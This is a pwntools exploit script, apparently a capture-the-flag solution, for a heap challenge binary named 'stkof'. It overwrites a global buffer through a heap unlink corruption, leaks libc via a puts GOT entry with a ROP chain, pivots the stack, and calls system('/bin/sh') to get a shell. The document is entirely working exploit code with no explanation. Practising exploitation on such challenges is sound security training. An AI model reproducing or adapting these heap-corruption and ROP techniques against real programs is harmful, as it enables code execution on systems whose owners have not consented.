from pwn import *

# init
r = process('./stkof')
e = ELF('./stkof')
libc = e.libc
context.arch = 'amd64'
#context.log_level = 'debug'

# global variable
buf = 0x602140
prdi = 0x0000000000400dc3# : pop rdi ; ret
ppp = 0x0000000000400dbf# : pop rbp ; pop r14 ; pop r15 ; ret
prspppp = 0x0000000000400dbd# : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
fill_c = 0x4009e8

def alloc(size):
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK\n')
def fill(index, content):
    r.sendline('2')
    r.sendline(str(index))
    r.sendline(str(len(content)))
    r.send(content)
    r.recvuntil('OK')
def delete(index):
    r.sendline('3')
    r.sendline(str(index))

def packAll(rop):
    return flat([p64(x) for x in rop])

# overwrite buf
alloc(0x80)
alloc(0x80)
alloc(0x80)
fill(2, packAll([0, 0x81, buf-0x8, buf])+'\x00'*0x60+p64(0x80)+p64(0x90))
delete(3)

# craft first rop chain to leak libc and read in second rop chain
rop = []
rop += [prdi, e.got['puts']]
rop += [e.plt['puts']]
rop += [fill_c]
rop += [fill_c]
rop += [buf+0x438]
fill(2, '\x00'*0x8+p64(e.got['malloc'])+p64(buf+0x600-0x740+0x588-0x8)+'\x00'*0x408+packAll(rop))

# stack pivoting
fill(0, p64(ppp))
r.sendline('1')
r.send(p64(prspppp)+p64(buf+0x400))
r.recvuntil('OK\n')
puts = u64(r.recv(6)+'\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

# second rop chain to get shell
r.sendline('2')
r.sendline(str(0x10))
r.send('A'*0x10)

r.sendline('1')
rop = []
rop += [prdi, libc_base + libc.search('/bin/sh\x00').next()]
rop += [libc_base + libc.symbols['system']]
r.sendline(str(0x18))
r.send(packAll(rop))

r.interactive()
